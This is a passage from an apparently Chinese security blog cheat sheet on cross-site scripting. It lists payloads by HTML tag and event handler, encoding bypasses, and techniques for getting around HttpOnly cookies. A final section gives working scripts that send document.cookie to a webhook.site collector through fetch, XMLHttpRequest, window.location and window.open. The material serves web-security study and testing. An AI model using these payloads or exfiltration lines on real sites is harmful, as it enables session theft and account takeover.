class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>) </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>img src=&quot;/1.png&quot;&gt;</span><br></pre></td></tr></table></figure><p>浏览器会将第一个尖括号视为整体标签名的起始符号，而第二个尖括号则是<code>&lt;script&gt;</code> 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现XSS攻击</p><h3 id="6-插入到CSS中"><a href="#6-插入到CSS中" class="headerlink" title="6.插入到CSS中"></a>6.插入到CSS中</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`1`)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>我们在background-image样式属性中插入了一段JavaScript url（<em>在过去，一些浏览器可能没有严格限制这种用法，允许<code>javascript:</code>伪协议在CSS属性中执行JavaScript代码。</em>），当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码。</p><h3 id="7-插入到HTTP响应中"><a href="#7-插入到HTTP响应中" class="headerlink" title="7.插入到HTTP响应中"></a>7.插入到HTTP响应中</h3><p><strong>先留一个坑，还没看懂这个部分，后面再来填</strong></p><h1 id="运行脚本的标签以及对应属性"><a href="#运行脚本的标签以及对应属性" class="headerlink" title="运行脚本的标签以及对应属性"></a>运行脚本的标签以及对应属性</h1><h3 id="标签"><a href="#标签" class="headerlink" title="&lt;a&gt; 标签"></a><code>&lt;a&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>href</code>属性（手动点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-1"><a href="#标签-1" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>onerror</code>（加载错误时触发XSS、将src乱输入一个值即可）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;v</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-2"><a href="#标签-2" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;</code>标签</h3><p>HTML 内联框架元素 (<code>&lt;iframe&gt;</code>)</p><p><strong>对应属性：</strong></p><p><code>onload</code>（加载完成时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>src</code>属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; </span><br><span class="line">//base64解码后为&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-3"><a href="#标签-3" class="headerlink" title="&lt;audio&gt; 标签"></a><code>&lt;audio&gt;</code> 标签</h3><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p><p><strong>对应属性：</strong></p><p><code>onerror</code>（加载错误时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-4"><a href="#标签-4" class="headerlink" title="&lt;video&gt;标签"></a><code>&lt;video&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>onerror</code>（加载错误时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-5"><a href="#标签-5" class="headerlink" title="&lt;svg&gt; 标签"></a><code>&lt;svg&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onload</code>（加载完成时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-6"><a href="#标签-6" class="headerlink" title="&lt;button&gt; 标签"></a><code>&lt;button&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseup</code>（鼠标按钮释放时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>onmousedown</code>（鼠标按钮按下时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-7"><a href="#标签-7" class="headerlink" title="&lt;div&gt;标签"></a><code>&lt;div&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><p>这个需要借助url编码来实现绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-8"><a href="#标签-8" class="headerlink" title="&lt;object&gt;标签"></a><code>&lt;object&gt;</code>标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-9"><a href="#标签-9" class="headerlink" title="&lt;script&gt; 标签"></a><code>&lt;script&gt;</code> 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-10"><a href="#标签-10" class="headerlink" title="&lt;p&gt; 标签"></a><code>&lt;p&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-11"><a href="#标签-11" class="headerlink" title="&lt;input&gt; 标签"></a><code>&lt;input&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onclick</code>（点击时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>onkeydown</code>（键盘按键按下时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure><p><code>onkeydown</code>（在键盘按键按下并释放一个键时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-12"><a href="#标签-12" class="headerlink" title="&lt;details&gt;标签"></a><code>&lt;details&gt;</code>标签</h3><p><strong>对应属性：</strong></p><p><code>ontoggle</code>（切换时触发XSS，如:详情元素展开或收起）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-13"><a href="#标签-13" class="headerlink" title="&lt;select&gt; 标签"></a><code>&lt;select&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure><p><code>onclick</code>（点击时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-14"><a href="#标签-14" class="headerlink" title="&lt;form&gt; 标签"></a><code>&lt;form&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseout</code>（鼠标移出时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><code>action</code>（提交表单时触发）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="标签-15"><a href="#标签-15" class="headerlink" title="&lt;body&gt; 标签"></a><code>&lt;body&gt;</code> 标签</h3><p><strong>对应属性：</strong></p><p><code>onload</code>（加载完成时触发XSS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><h1 id="外带COOKIE"><a href="#外带COOKIE" class="headerlink" title="外带COOKIE"></a>外带COOKIE</h1><h2 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h2><h3 id="未设置为HttpOnly"><a href="#未设置为HttpOnly" class="headerlink" title="未设置为HttpOnly"></a>未设置为<code>HttpOnly</code></h3><h4 id="方法：document-cookie"><a href="#方法：document-cookie" class="headerlink" title="方法：document.cookie"></a>方法：<code>document.cookie</code></h4><p>可获得所有的 <code>Cookie</code>，每条 <code>cookie</code> 以<code>分号和空格 </code>分隔 (即， <code>key=value</code> 键值对)。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=a378eb5d1c4e12d492e63273f7b68c01%40devS; language=zh; _gat=1</span><br></pre></td></tr></table></figure><h3 id="设置为HttpOnly"><a href="#设置为HttpOnly" class="headerlink" title="设置为HttpOnly"></a>设置为<code>HttpOnly</code></h3><blockquote><p><code>HttpOnly</code>是包含在<code>Set-Cookie HTTP</code>响应头文件中的附加标志。生成cookie时使用<code>HttpOnly</code>标志有助于降低客户端脚本访问受保护<code>cookie</code>的风险（如果浏览器支持）。</p><p>即如果某一个Cookie 选项被设置成 <code>HttpOnly = true</code> 的话，那此<code>Cookie</code> <strong>只能通过服务器端修改，Js 是操作不了的</strong>，此时<code>document.cookie</code> 无效。</p></blockquote><h4 id="方法一：cookie回显页面"><a href="#方法一：cookie回显页面" class="headerlink" title="方法一：cookie回显页面"></a>方法一：cookie回显页面</h4><p>利用服务器中的cookie回显页面，如：<code>PHPinfo</code>页面</p><p><strong>条件：</strong>有相关请求页面可以回显出cookie</p><p><strong>参考链接</strong>：<a href="https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page">How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation</a></p><h4 id="方法二：TRACE-HTTP"><a href="#方法二：TRACE-HTTP" class="headerlink" title="方法二：TRACE HTTP"></a>方法二：TRACE HTTP</h4><blockquote><p>HTTP定义了8种标准的请求方法，包括<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>、<code>OPTIONS</code>、<code>TRACE</code>和<code>CONNECT</code>。其中<code>TRACE</code>用于回显服务器收到的请求。</p></blockquote><p><strong>条件：</strong>服务器支持<code>TRACE</code>方式请求</p><p><strong>注</strong>：现代浏览器不允许从 JS 发送 TRACE 请求，从而避免了这种技术。但是，在特定软件中发现了一些绕过此方法的方法，例如发送 <code>\r\nTRACE</code> 而不是 <code>TRACE</code> 发送到 IE6.0 SP2。</p><h4 id="方法三：-Cookie-Jar-溢出"><a href="#方法三：-Cookie-Jar-溢出" class="headerlink" title="方法三： Cookie Jar 溢出"></a>方法三： Cookie Jar 溢出</h4><p><strong>参考链接</strong>：<a href="https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow">Cookie Jar Overflow</a>、<a href="https://medium.com/@ibm_ptc_security/cookie-jar-overflow-attack-ae5135b6100">Cookie Jar Overflow Attack</a></p><h4 id="方法四：表单劫持"><a href="#方法四：表单劫持" class="headerlink" title="方法四：表单劫持"></a>方法四：表单劫持</h4><p>XSS能插入在登录表单页面，能直接获取登录的账号密码，使用账号密码登录</p><h4 id="方法五：浏览器漏洞、中间件漏洞"><a href="#方法五：浏览器漏洞、中间件漏洞" class="headerlink" title="方法五：浏览器漏洞、中间件漏洞"></a>方法五：浏览器漏洞、中间件漏洞</h4><p>例如：Apache服务器漏洞 CVE-2012-0053</p><p>影响版本：2.2.0-2.2.21</p><p>攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的<code>LititRequestFieldSize</code> (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了<code>HttpOnly</code> 保护的Cookie。</p><h2 id="带出cookie"><a href="#带出cookie" class="headerlink" title="带出cookie"></a>带出cookie</h2><h4 id="fetch-方法"><a href="#fetch-方法" class="headerlink" title="fetch()方法"></a><code>fetch()</code>方法</h4><p>全局的 <code>fetch()</code> 方法用于发起获取资源的请求。它返回一个 promise，这个 promise 会在请求响应后被 resolve，并传回 <code>Response</code>对象。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure><p>详细参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch">fetch() - Web API 接口参考 | MDN (mozilla.org)</a></p><h4 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a><code>XMLHttpRequest</code> 对象</h4><p>利用 <code>XMLHttpRequest</code> 对象发送 HTTP 请求，将 Cookie 数据发送到攻击者的服务器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>, <span class="literal">true</span>); xhr.<span class="title function_">send</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>详细参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XMLHttpRequest - Web API 接口参考 | MDN (mozilla.org)</a></p><h4 id="window-location-对象"><a href="#window-location-对象" class="headerlink" title="window.location 对象"></a><code>window.location</code> 对象</h4><p> <code>window.location</code> 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>下面是<code>window.location</code> 对象中<strong>可用于跳转的方法</strong>：</p><ol><li><code>window.location.href</code>：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure><ol><li><code>window.location.assign(url)</code>：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">assign</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure><ol><li><code>window.location.replace(url)</code>：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure><h4 id="window-open方法"><a href="#window-open方法" class="headerlink" title="window.open方法"></a><code>window.open</code>方法</h4><p><code>window.open()</code> 是 JavaScript 中用于<strong>打开新窗口或新标签页</strong>的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象。</p><p>例如，以下代码将会在新窗口或新标签页中打开指定 URL：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure><h4 id="document-write方法"><a href="#document-write方法" class="headerlink" title="document.write方法"></a><code>document.write</code>方法</h4><p>利用 <code>document.write</code> 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`&lt;img 